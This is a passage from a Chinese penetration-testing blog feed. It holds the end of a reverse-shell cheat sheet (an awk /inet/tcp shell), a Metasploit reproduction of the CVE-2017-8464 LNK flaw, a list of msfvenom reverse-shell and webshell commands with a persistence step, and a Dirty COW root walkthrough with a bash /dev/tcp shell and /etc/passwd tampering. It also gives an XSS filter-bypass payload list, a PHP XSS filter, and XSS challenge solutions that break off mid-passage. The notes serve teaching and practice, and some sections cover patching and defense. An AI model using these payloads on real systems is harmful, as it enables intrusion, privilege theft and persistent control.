class="line">                        if (cmd) &#123;</div><div class="line">                                while ((cmd |&amp; getline) &gt; 0)</div><div class="line">                                        print $0 |&amp; Service</div><div class="line">                                close(cmd)</div><div class="line">                        &#125;</div><div class="line">                &#125; while (cmd != &quot;exit&quot;)</div><div class="line">                close(Service)</div><div class="line">        &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p><strong>11、awk</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">awk &apos;BEGIN&#123;s=&quot;/inet/tcp/0/192.168.1.128/8080&quot;;for(;s|&amp;getline c;close(c))while(c|getline)print|&amp;s;close(s)&#125;&apos;</div></pre></td></tr></table></figure></p><p>参考链接：<br><a href="http://www.freebuf.com/articles/system/147768.html" target="_blank" rel="external">http://www.freebuf.com/articles/system/147768.html</a><br><a href="https://www.cnblogs.com/r00tgrok/p/reverse_shell_cheatsheet.html" target="_blank" rel="external">https://www.cnblogs.com/r00tgrok/p/reverse_shell_cheatsheet.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;主要反弹方式&quot;&gt;&lt;a href=&quot;#主要反弹方式&quot; class=&quot;headerlink&quot; title=&quot;主要反弹方式&quot;&gt;&lt;/a&gt;主要反弹方式&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;首先vps监听：&lt;code&gt;nc –l –vv –p port&lt;/code&gt;
    
    </summary>
    
      <category term="渗透测试" scheme="http://sunu11.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="nc" scheme="http://sunu11.com/tags/nc/"/>
    
      <category term="内网渗透" scheme="http://sunu11.com/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>LNK文件（快捷方式）远程代码执行漏洞（复现）</title>
    <link href="http://sunu11.com/2017/08/29/17/"/>
    <id>http://sunu11.com/2017/08/29/17/</id>
    <published>2017-08-29T12:26:59.000Z</published>
    <updated>2018-11-03T11:57:59.917Z</updated>
    
    <content type="html"><![CDATA[<h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>名称：CVE-2017-8464 LNK文件（快捷方式）远程代码执行漏洞</p><p>概要：攻击者可以通过可移动驱动器（U盘）或远程共享等方式将包含恶意LNK文件和与之相关<a id="more"></a>的恶意二进制文件传播给用户。当用户通过Windows资源管理器或任何能够解析LNK文件的程序打开恶意的LNK文件时，与之关联的恶意二进制代码将在目标系统上执行。</p><h3 id="复现："><a href="#复现：" class="headerlink" title="复现："></a>复现：</h3><p>攻击机kali：192.168.86.180</p><p>靶机win10（64位）：192.168.86.177</p><p>首先kali下载exp：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">cd /opt</div><div class="line">Wget   https://raw.githubusercontent.com/ykoster/metasploit-framework/169e00bf3442447324df064192db62cdc5b5b860/modules/exploits/windows/fileformat/cve_2017_8464_lnk_rce.rb</div></pre></td></tr></table></figure></p><p>  copy exp到/usr/share/metasploit-framework/modules/exploit/windows/smb/目录下<br><code>cp  cve_2017_8464_lnk_rce.rb  /usr/share/metasploit-framework/modules/exploits/windows/smb/</code></p><p>生成监听shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">msf &gt; use exploit/multi/handler   使用exploit/multi/handler监听连入的backdoor</div><div class="line">msf exploit(handler) &gt; set PAYLOAD windows/x64/meterpreter/reverse_tcp 设置对应的payload</div><div class="line">msf exploit(handler) &gt; set LHOST 192.168.86.180</div><div class="line">msf exploit(handler) &gt; exploit -j</div></pre></td></tr></table></figure><p>生成.LNK文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">use exploit/windows/smb/cve_2017_8464_lnk_rce</div><div class="line">msf exploit(cve_2017_8464_lnk_rce) &gt; set PAYLOAD windows/x64/meterpreter/reverse_tcp</div><div class="line">msf exploit(cve_2017_8464_lnk_rce) &gt; set LHOST 192.168.86.180</div><div class="line">msf exploit(cve_2017_8464_lnk_rce) &gt; exploit</div></pre></td></tr></table></figure><p>将生成的dll文件和以U盘盘符结尾的.LNK文件复制到U盘中；当插入U盘至主机，在靶机上双击.LNK文件，即可触发dll文件建立连接。</p><p><img src="http://n-b.oss-cn-beijing.aliyuncs.com/q-21.png" alt="q-1"><br><img src="http://n-b.oss-cn-beijing.aliyuncs.com/q-22.png" alt="q-2"></p><h3 id="影响版本："><a href="#影响版本：" class="headerlink" title="影响版本："></a>影响版本：</h3><p>桌面系统：Windows 10, 7, 8.1, 8, Vista和Windows RT 8.1<br>服务器系统：Windows Server 2016，2012，2008</p><h3 id="修复："><a href="#修复：" class="headerlink" title="修复："></a>修复：</h3><p>桌面系统Windows 10,7,8.1和Windows RT 8.1；服务器系统：Windows Server 2016，2012，2008，可以通过Windows Update自动更新微软补丁的方式进行修复。<br>Windows 8, Vista可以通过选择对应版本然后手动更新补丁的方式进行更新<br>（补丁下载地址参考）<a href="https://support.microsoft.com/zh-cn/help/4025687/microsoft-security-advisory-4025685-guidance-for-older-platforms" target="_blank" rel="external">https://support.microsoft.com/zh-cn/help/4025687/microsoft-security-advisory-4025685-guidance-for-older-platforms</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;介绍&quot;&gt;&lt;a href=&quot;#介绍&quot; class=&quot;headerlink&quot; title=&quot;介绍&quot;&gt;&lt;/a&gt;介绍&lt;/h3&gt;&lt;p&gt;名称：CVE-2017-8464 LNK文件（快捷方式）远程代码执行漏洞&lt;/p&gt;
&lt;p&gt;概要：攻击者可以通过可移动驱动器（U盘）或远程共享等方式将包含恶意LNK文件和与之相关
    
    </summary>
    
      <category term="渗透测试" scheme="http://sunu11.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="CVE-2017-8464" scheme="http://sunu11.com/tags/CVE-2017-8464/"/>
    
  </entry>
  
  <entry>
    <title>msfvenom生成payload的方法</title>
    <link href="http://sunu11.com/2017/08/29/16/"/>
    <id>http://sunu11.com/2017/08/29/16/</id>
    <published>2017-08-29T12:10:56.000Z</published>
    <updated>2018-02-26T04:25:52.913Z</updated>
    
    <content type="html"><![CDATA[<h4 id="二进制文件"><a href="#二进制文件" class="headerlink" title="二进制文件"></a>二进制文件</h4><p>Windows<a id="more"></a></p><p><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT= Port -f exe &gt; shell.exe</code></p><p>Linux</p><p><code>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST= IP LPORT= Port -f elf &gt; shell.elf</code></p><p>Mac</p><p><code>msfvenom -p osx/x86/shell_reverse_tcp LHOST= IP LPORT= Port -f macho &gt; shell.macho</code></p><h4 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h4><p>PHP</p><p><code>msfvenom -p php/meterpreter_reverse_tcp LHOST= IP LPORT= Port -f raw &gt; shell.php</code></p><p>ASP</p><p><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=Port -f asp &gt; shell.asp</code></p><p>JSP</p><p><code>msfvenom -p java/jsp_shell_reverse_tcp LHOST= IP LPORT= Port -f raw &gt; shell.jsp</code></p><p>WAR</p><p><code>msfvenom -p java/jsp_shell_reverse_tcp LHOST= IP LPORT=Port -f war &gt; shell.war</code></p><h4 id="脚本shell（反弹shell）"><a href="#脚本shell（反弹shell）" class="headerlink" title="脚本shell（反弹shell）"></a>脚本shell（反弹shell）</h4><p>Python</p><p><code>msfvenom -p cmd/unix/reverse_python LHOST= IP LPORT=Port -f raw &gt; shell.py</code></p><p>Bash</p><p><code>msfvenom -p cmd/unix/reverse_bash LHOST= IP LPORT=Port -f raw &gt; shell.sh</code></p><p>Perl</p><p><code>msfvenom -p cmd/unix/reverse_perl LHOST= IP LPORT=Port -f raw &gt; shell.pl</code></p><h4 id="附：持续控制"><a href="#附：持续控制" class="headerlink" title="附：持续控制"></a>附：持续控制</h4><p>在攻击成功之后会反弹回一个会话，当木马被删除或不继续运行时，我们就无法再获得反弹的会话，那么想要进行一个持续的控制就需要在第一次获得会话时动一些手脚<br>run persistence -U -i 5 –r ip port<br>-U 用户登录时反弹会话 也可以使用-X当系统启动时反弹会话<br>-i 时间</p>]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;二进制文件&quot;&gt;&lt;a href=&quot;#二进制文件&quot; class=&quot;headerlink&quot; title=&quot;二进制文件&quot;&gt;&lt;/a&gt;二进制文件&lt;/h4&gt;&lt;p&gt;Windows
    
    </summary>
    
      <category term="渗透测试" scheme="http://sunu11.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="msfvenom" scheme="http://sunu11.com/tags/msfvenom/"/>
    
  </entry>
  
  <entry>
    <title>Dirty COW的那些事</title>
    <link href="http://sunu11.com/2017/08/28/15/"/>
    <id>http://sunu11.com/2017/08/28/15/</id>
    <published>2017-08-28T14:08:08.000Z</published>
    <updated>2018-11-03T11:57:21.377Z</updated>
    
    <content type="html"><![CDATA[<p>本文又是一次笔记回顾，将doc的笔记用markdown写一遍，回顾一下23333333<a id="more"></a></p><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>漏洞编号：CVE-2016-5195 </p><p>漏洞名称：脏牛（Dirty COW） </p><p>漏洞危害：低权限用户利用该漏洞技术可以在全版本 Linux 系统上实现本地提权 </p><p>影响范围：Linux 内核2.6.22 &lt; 3.9 (x86/x64)</p><p>原理:<br>Linux 内核的内存子系统在处理写入时复制（copy-on-write, COW）时产生了竞争条件（race<br>condition）。恶意用户可利用此漏洞，来获取高权限，对只读内存映射进行写访问。（A race condition was found in the way the Linux kernel’s memory subsystem handled the copy-on-write (COW) breakage of private read-only memory mappings.） 竞争条件，指的是任务执行顺序异常，可导致应用崩溃，或令攻击者有机可乘，进一步执行其他代码。利用这一漏洞，攻击者可在其目标系统提升权限，可以获得 root 权限。<br><em>*</em>利用：<a href="https://github.com/dirtycow/dirtycow.github.io/blob/master/pokemon.c" target="_blank" rel="external">exp</a></p><h3 id="复现与总结"><a href="#复现与总结" class="headerlink" title="复现与总结"></a>复现与总结</h3><p>在本地部署一个漏洞环境，使用web服务器上的大马反弹 shell后利用dirty cow 进行提权<br>    反弹shell：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">nc -l -p 22222 -vv </div><div class="line">bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1</div></pre></td></tr></table></figure></p><p>查看版本：<br><code>cat /proc/version、uname -a、lsb release -a</code>均可</p><p>编译：<br><code>gcc -pthread exp.c -o exp -lcrypt</code></p><p>执行./exp 即可为用户firefart 设置密码</p><p><img src="http://n-b.oss-cn-beijing.aliyuncs.com/q-17.png" alt="q-17"></p><p>然后即可用添加的用户连接主机</p><p><img src="http://n-b.oss-cn-beijing.aliyuncs.com/q-18.png" alt="q-18"></p><p>除此之外，还可以用下面一些方式进行提权（学习自互联网）<br>1)在/tmp/.pwn写入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">#!/bin/bash</div><div class="line">echo MOOOOOOOOOOO</div><div class="line">/bin/bash</div></pre></td></tr></table></figure><p>chmod+x/tmp/.pwn<br>然后修改/etc/passwd中的shell指向<br><code>./dirtyc0w /etc/passwd root:x:0:0:root:/root:/tmp/.pwn</code></p><p>2)添加用户到sudo组</p><p><code>./dirtyc0w /etc/group &quot;$(sed&#39;s/\(sudo:x:.*:\)/\1test1/g&#39;/etc/group)&quot;</code></p><p>下次管理员再登陆的话 sudo su不需要密码</p><p>3)将/etc/passwd中的uid位改为0</p><p>4)注入shellcode到suid文件，比如最常见的2个文件<br><code>/usr/bin/crontab</code><br><code>/usr/bin/passwd</code></p><p>修复方案：</p><pre><code>Centos/RHEL更新sudo yum updateUbuntu/Debian更新sudo apt-get update &amp;&amp; sudo apt-get dist-upgrade</code></pre><p>更新到最新的内核版本即可。<strong><em>需要重启才能生效</em></strong></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本文又是一次笔记回顾，将doc的笔记用markdown写一遍，回顾一下23333333
    
    </summary>
    
      <category term="渗透测试" scheme="http://sunu11.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="Linux提权" scheme="http://sunu11.com/tags/Linux%E6%8F%90%E6%9D%83/"/>
    
  </entry>
  
  <entry>
    <title>我与XSS的感情之路(3)</title>
    <link href="http://sunu11.com/2017/08/28/14/"/>
    <id>http://sunu11.com/2017/08/28/14/</id>
    <published>2017-08-28T07:18:08.000Z</published>
    <updated>2018-11-03T11:56:59.172Z</updated>
    
    <content type="html"><![CDATA[<h3 id="心得"><a href="#心得" class="headerlink" title="心得"></a>心得</h3><p>接着上一文过来，这一部分是个人的一些总结。对于挖掘xss漏洞，目的都是让自己的payload可以执行，在其探索的过程中，我个人首先会通过审查元素，了解其输入点，过滤规则，然后<a id="more"></a>再针对性的进行payload的构造。首先，输入框、flash、css、上传点、http头部的字段、第三方插件、能主动修改其参数值的任意参数等等，存在输入的地方都有可能存在xss。明确好目标后，我习惯先输入一堆测试字符看看其过滤规则：<br><code>&#39;&#39;;!--&quot;&lt;XSS&gt;=&amp;{()}/&#39;script、on、alert、prompt、confirm、&lt;script src=&quot;http://x.js&quot;&gt; %c0u003cimg+src%3d1+onerror%3dalert(/xss/)+%c0u003e……</code><br>一般都能判断出如何过滤的，就像之前做题的过程中，都是经过测试才有结果，才能对症下药。</p><p>然后对于过滤规则，我总结了这样几点：</p><h4 id="1、大小写："><a href="#1、大小写：" class="headerlink" title="1、大小写："></a>1、大小写：</h4><p><code>&lt;ScRIpT&gt;alert(&#39;123&#39;)&lt;/sCRIpT&gt;</code></p><h4 id="2、编码绕过："><a href="#2、编码绕过：" class="headerlink" title="2、编码绕过："></a>2、编码绕过：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">.十六进制编码</div><div class="line">.jsfuck编码</div><div class="line">.url编码</div><div class="line">.unicode编码</div><div class="line">.加解密</div><div class="line">.HTML编码</div><div class="line">.hex编码</div><div class="line">.ASCII编码</div></pre></td></tr></table></figure><h4 id="3、绕过magic-quotes-gpc："><a href="#3、绕过magic-quotes-gpc：" class="headerlink" title="3、绕过magic_quotes_gpc："></a>3、绕过magic_quotes_gpc：</h4><p><code>&lt;script&gt;String.fromCharCode(97, 108, 101, 114, 116, 40, 34, 88, 83, 83, 34, 41, 59)&lt;/script&gt;</code></p><h4 id="4、闭合标签"><a href="#4、闭合标签" class="headerlink" title="4、闭合标签"></a>4、闭合标签</h4><p><code>&quot;&gt;&lt;script&gt;alert(/123/)&lt;/script&gt;</code><br><code>&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></p><h4 id="5、标签绕过"><a href="#5、标签绕过" class="headerlink" title="5、标签绕过"></a>5、标签绕过</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&lt;img src=&quot;x&quot; onerror=&quot;alert(1)&quot;&gt;</div><div class="line">&lt;button onclick=&quot;javascript:alert(&apos;xss&apos;)&gt;XSS&lt;/button&quot;&gt;</div><div class="line">&lt;title&gt;&lt;img a=&quot;&lt;/title&gt;&lt;img/src=1 onerror=alert(1)//&quot;&gt;</div><div class="line">&quot;onsubmit=javascript:alert(1)%20name=&quot;a</div><div class="line">&lt;svg/onload=prompt(1)&gt;等等</div></pre></td></tr></table></figure><h4 id="6、其他符号绕过"><a href="#6、其他符号绕过" class="headerlink" title="6、其他符号绕过"></a>6、其他符号绕过</h4><table><thead><tr><th>%0a alert(1);</th><th>%0a 换行符 %0d</th></tr></thead><tbody><tr><td>/**/</td><td>替换空格</td></tr></tbody></table><hr><p>%00           |截断</p><p><strong><em>另外在某些情况下，当”被过滤，可以在IE内核下使用两个反引号(`)TAB键上面的那个代替双引号.</em></strong></p><h5 id="7、双字母绕过-lt-img-ononerrorerror-quot-123-quot-gt-、-lt-script-gt-alalertert-123-lt-script-gt"><a href="#7、双字母绕过-lt-img-ononerrorerror-quot-123-quot-gt-、-lt-script-gt-alalertert-123-lt-script-gt" class="headerlink" title="7、双字母绕过 &lt;img ononerrorerror=&quot;123&quot;&gt;、&lt;script&gt;alalertert(123)&lt;/script&gt;"></a>7、双字母绕过 <code>&lt;img ononerrorerror=&quot;123&quot;&gt;、&lt;script&gt;alalertert(123)&lt;/script&gt;</code></h5><h5 id="8、宽字节绕过"><a href="#8、宽字节绕过" class="headerlink" title="8、宽字节绕过"></a>8、宽字节绕过</h5><p>gbxxxx系列的编码，那么我们尝试一下宽字节  <code>%c0 %bf  %5c</code></p><h4 id="9、其他事件绕过"><a href="#9、其他事件绕过" class="headerlink" title="9、其他事件绕过"></a>9、其他事件绕过</h4><p>（比如过滤了&lt;&gt;使用 <code>&quot;onmouseover=alert(11)  bad=</code>）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">  onload</div><div class="line">  onclick</div><div class="line">  onerror</div><div class="line">  prompt</div><div class="line">  confirm</div><div class="line">  onmousemove</div></pre></td></tr></table></figure></p><p><strong><em>附录1：</em></strong></p><table><thead><tr><th>type</th><th>Horizontal Tab</th><th>New line</th><th>Carriage Return</th></tr></thead><tbody><tr><td>URL</td><td>%09</td><td>%10</td><td>%13         </td></tr></tbody></table><p>空字符  (%00) 使得过滤器不能看到完整的 <code>&lt;script&gt;</code>标签. 只在 IE 6.0, IE 7.0 可以。</p><p><strong><em>附录2：</em></strong></p><table><thead><tr><th>blank</th><th>%20 </th></tr></thead><tbody><tr><td>/</td><td>%2F  </td></tr><tr><td>——</td><td>——</td></tr><tr><td>?</td><td>%3F</td></tr><tr><td>——</td><td>——</td></tr><tr><td>+</td><td>%2B</td></tr></tbody></table><h3 id="防御："><a href="#防御：" class="headerlink" title="防御："></a>防御：</h3><p>对于采用过滤、转义来防御xss漏洞最基本的方式，具体实现，必须基于代码，而对应的防御招式已经许多前辈们都有分享。我觉得做好编码、过滤的工作之后，下面两个措施也是有必要实施的。<br>1：为Cookie加上HttpOnly标记。保护好cookie，就算各种过滤都被绕过，也无法读取、修改cookie，能有效的减轻危害。<br>2：部署waf是一件很有效的工作。一个具有丰富规则库的waf能大幅度过滤掉恶意输入数据，个人感觉主要是能增加突破防御的难度，不仅仅针对于xss漏洞，其他的漏洞也是一样。能有效降低其风险。<br>下面是一个php的xss过滤器：(学习于网上，将该代码加入到核心函数库，然后再调用即可)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div></pre></td><td class="code"><pre><div class="line">&lt;?php  </div><div class="line">    function RemoveXSS($val) &#123;  </div><div class="line">       // remove all non-printable characters. CR(0a) and LF(0b) and TAB(9) are allowed  </div><div class="line">       // this prevents some character re-spacing such as &lt;java\0script&gt;  </div><div class="line">       // note that you have to handle splits with \n, \r, and \t later since they *are* allowed in some inputs  </div><div class="line">       $val = preg_replace(&apos;/([\x00-\x08,\x0b-\x0c,\x0e-\x19])/&apos;, &apos;&apos;, $val);  </div><div class="line">         </div><div class="line">       // straight replacements, the user should never need these since they&apos;re normal characters  </div><div class="line">       // this prevents like &lt;IMG SRC=@avascript:alert(&apos;XSS&apos;)&gt;  </div><div class="line">       $search = &apos;abcdefghijklmnopqrstuvwxyz&apos;; </div><div class="line">       $search .= &apos;ABCDEFGHIJKLMNOPQRSTUVWXYZ&apos;;  </div><div class="line">       $search .= &apos;1234567890!@#$%^&amp;*()&apos;; </div><div class="line">       $search .= &apos;~`&quot;;:?+/=&#123;&#125;[]-_|\&apos;\\&apos;; </div><div class="line">       for ($i = 0; $i &lt; strlen($search); $i++) &#123; </div><div class="line">          // ;? matches the ;, which is optional </div><div class="line">          // 0&#123;0,7&#125; matches any padded zeros, which are optional and go up to 8 chars </div><div class="line">        </div><div class="line">          // @ @ search for the hex values </div><div class="line">          $val = preg_replace(&apos;/(&amp;#[xX]0&#123;0,8&#125;&apos;.dechex(ord($search[$i])).&apos;;?)/i&apos;, $search[$i], $val); // with a ; </div><div class="line">          // @ @ 0&#123;0,7&#125; matches &apos;0&apos; zero to seven times  </div><div class="line">          $val = preg_replace(&apos;/(&amp;#0&#123;0,8&#125;&apos;.ord($search[$i]).&apos;;?)/&apos;, $search[$i], $val); // with a ; </div><div class="line">       &#125; </div><div class="line">        </div><div class="line">       // now the only remaining whitespace attacks are \t, \n, and \r </div><div class="line">       $ra1 = Array(&apos;javascript&apos;, &apos;vbscript&apos;, &apos;expression&apos;, &apos;applet&apos;, &apos;meta&apos;, &apos;xml&apos;, &apos;blink&apos;, &apos;link&apos;, &apos;style&apos;, &apos;script&apos;, &apos;embed&apos;, &apos;object&apos;, &apos;iframe&apos;, &apos;frame&apos;, &apos;frameset&apos;, &apos;ilayer&apos;, &apos;layer&apos;, &apos;bgsound&apos;, &apos;title&apos;, &apos;base&apos;); </div><div class="line">       $ra2 = Array(&apos;onabort&apos;, &apos;onactivate&apos;, &apos;onafterprint&apos;, &apos;onafterupdate&apos;, &apos;onbeforeactivate&apos;, &apos;onbeforecopy&apos;, &apos;onbeforecut&apos;, &apos;onbeforedeactivate&apos;, &apos;onbeforeeditfocus&apos;, &apos;onbeforepaste&apos;, &apos;onbeforeprint&apos;, &apos;onbeforeunload&apos;, &apos;onbeforeupdate&apos;, &apos;onblur&apos;, &apos;onbounce&apos;, &apos;oncellchange&apos;, &apos;onchange&apos;, &apos;onclick&apos;, &apos;oncontextmenu&apos;, &apos;oncontrolselect&apos;, &apos;oncopy&apos;, &apos;oncut&apos;, &apos;ondataavailable&apos;, &apos;ondatasetchanged&apos;, &apos;ondatasetcomplete&apos;, &apos;ondblclick&apos;, &apos;ondeactivate&apos;, &apos;ondrag&apos;, &apos;ondragend&apos;, &apos;ondragenter&apos;, &apos;ondragleave&apos;, &apos;ondragover&apos;, &apos;ondragstart&apos;, &apos;ondrop&apos;, &apos;onerror&apos;, &apos;onerrorupdate&apos;, &apos;onfilterchange&apos;, &apos;onfinish&apos;, &apos;onfocus&apos;, &apos;onfocusin&apos;, &apos;onfocusout&apos;, &apos;onhelp&apos;, &apos;onkeydown&apos;, &apos;onkeypress&apos;, &apos;onkeyup&apos;, &apos;onlayoutcomplete&apos;, &apos;onload&apos;, &apos;onlosecapture&apos;, &apos;onmousedown&apos;, &apos;onmouseenter&apos;, &apos;onmouseleave&apos;, &apos;onmousemove&apos;, &apos;onmouseout&apos;, &apos;onmouseover&apos;, &apos;onmouseup&apos;, &apos;onmousewheel&apos;, &apos;onmove&apos;, &apos;onmoveend&apos;, &apos;onmovestart&apos;, &apos;onpaste&apos;, &apos;onpropertychange&apos;, &apos;onreadystatechange&apos;, &apos;onreset&apos;, &apos;onresize&apos;, &apos;onresizeend&apos;, &apos;onresizestart&apos;, &apos;onrowenter&apos;, &apos;onrowexit&apos;, &apos;onrowsdelete&apos;, &apos;onrowsinserted&apos;, &apos;onscroll&apos;, &apos;onselect&apos;, &apos;onselectionchange&apos;, &apos;onselectstart&apos;, &apos;onstart&apos;, &apos;onstop&apos;, &apos;onsubmit&apos;, &apos;onunload&apos;); </div><div class="line">       $ra = array_merge($ra1, $ra2); </div><div class="line">        </div><div class="line">       $found = true; // keep replacing as long as the previous round replaced something </div><div class="line">       while ($found == true) &#123; </div><div class="line">          $val_before = $val; </div><div class="line">          for ($i = 0; $i &lt; sizeof($ra); $i++) &#123; </div><div class="line">             $pattern = &apos;/&apos;; </div><div class="line">             for ($j = 0; $j &lt; strlen($ra[$i]); $j++) &#123; </div><div class="line">                if ($j &gt; 0) &#123; </div><div class="line">                   $pattern .= &apos;(&apos;;  </div><div class="line">                   $pattern .= &apos;(&amp;#[xX]0&#123;0,8&#125;([9ab]);)&apos;; </div><div class="line">                   $pattern .= &apos;|&apos;;  </div><div class="line">                   $pattern .= &apos;|(&amp;#0&#123;0,8&#125;([9|10|13]);)&apos;; </div><div class="line">                   $pattern .= &apos;)*&apos;; </div><div class="line">                &#125; </div><div class="line">                $pattern .= $ra[$i][$j]; </div><div class="line">             &#125; </div><div class="line">             $pattern .= &apos;/i&apos;;  </div><div class="line">             $replacement = substr($ra[$i], 0, 2).&apos;&lt;x&gt;&apos;.substr($ra[$i], 2); // add in &lt;&gt; to nerf the tag  </div><div class="line">             $val = preg_replace($pattern, $replacement, $val); // filter out the hex tags  </div><div class="line">             if ($val_before == $val) &#123;  </div><div class="line">                // no replacements were made, so exit the loop  </div><div class="line">                $found = false;  </div><div class="line">             &#125;  </div><div class="line">          &#125;  </div><div class="line">       &#125;  </div><div class="line">       return $val;  </div><div class="line">    &#125;   </div><div class="line">?&gt;</div></pre></td></tr></table></figure><p><strong><em>参考链接：</em></strong><br><a href="http://www.freebuf.com/sectool/108568.html" target="_blank" rel="external">http://www.freebuf.com/sectool/108568.html</a><br><a href="https://www.secpulse.com/archives/44299.html" target="_blank" rel="external">https://www.secpulse.com/archives/44299.html</a><br><a href="https://www.waitalone.cn/the-seven-principles-of-xss-defense.html" target="_blank" rel="external">https://www.waitalone.cn/the-seven-principles-of-xss-defense.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;心得&quot;&gt;&lt;a href=&quot;#心得&quot; class=&quot;headerlink&quot; title=&quot;心得&quot;&gt;&lt;/a&gt;心得&lt;/h3&gt;&lt;p&gt;接着上一文过来，这一部分是个人的一些总结。对于挖掘xss漏洞，目的都是让自己的payload可以执行，在其探索的过程中，我个人首先会通过审查元素，了解其输入点，过滤规则，然后
    
    </summary>
    
      <category term="WEB安全" scheme="http://sunu11.com/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="bypass" scheme="http://sunu11.com/tags/bypass/"/>
    
      <category term="xss" scheme="http://sunu11.com/tags/xss/"/>
    
  </entry>
  
  <entry>
    <title>我与XSS的感情之路(2)</title>
    <link href="http://sunu11.com/2017/07/23/13/"/>
    <id>http://sunu11.com/2017/07/23/13/</id>
    <published>2017-07-23T03:43:55.000Z</published>
    <updated>2018-11-03T11:56:48.470Z</updated>
    
    <content type="html"><![CDATA[<p>接着上一文过来，这一部分是第二个环境的做题记录。<a id="more"></a></p><h2 id="平台2-xsqler-win"><a href="#平台2-xsqler-win" class="headerlink" title="平台2 xsqler.win"></a>平台2 <a href="http://sqler.win/xss/index.php" target="_blank" rel="external">xsqler.win</a></h2><p><strong><em>Stage#1: <a href="http://sqler.win/xss/level1.php?name=test" target="_blank" rel="external">http://sqler.win/xss/level1.php?name=test</a></em></strong><br>本关简单，使用svg\body\style \ iframe等标签均可过关。<br>payload: <code>http://sqler.win/xss/level1.php?name=test&lt;body/onload=alert(1)&gt;</code></p><p><strong><em>Stage#2: <a href="http://sqler.win/xss/level2.php?keyword=test" target="_blank" rel="external">http://sqler.win/xss/level2.php?keyword=test</a></em></strong><br>本题与第一题差不多，只需要进行标签的闭合即可。<br>payload:<br><code>http://sqler.win/xss/level2.php?keyword=test&quot;&gt;&lt;body/onload=alert(1)&gt;</code></p><p><strong><em>Stage#3：<a href="http://sqler.win/xss/level3.php?writing=wait" target="_blank" rel="external">http://sqler.win/xss/level3.php?writing=wait</a></em></strong><br>本题通过测试，可得知过滤了&lt;&gt;，且只能用’闭合标签。于是采用on事件型如onmouseover、onmouseout、onclick等进行绕过。Payload: <code>&#39;onmouseover=&#39;alert(1)</code></p><p><strong><em>Stage#4: <a href="http://sqler.win/xss/level4.php?keyword=" target="_blank" rel="external">http://sqler.win/xss/level4.php?keyword=</a></em></strong><br>本题与上题类似，使用”闭合标签即可：payload：<code>&quot;onmouseover=&#39;alert(1)’</code></p><p><img src="http://n-b.oss-cn-beijing.aliyuncs.com/q-13.png" alt="图13"></p><p><strong><em>Stage#5: <a href="http://sqler.win/xss/level5.php?keyword=find" target="_blank" rel="external">http://sqler.win/xss/level5.php?keyword=find</a> a way out! </em></strong><br>本题比较简单，增加了过滤范围，on-&gt;o_n 然后需要闭合。可以使用<code>&quot;&gt;&lt;a 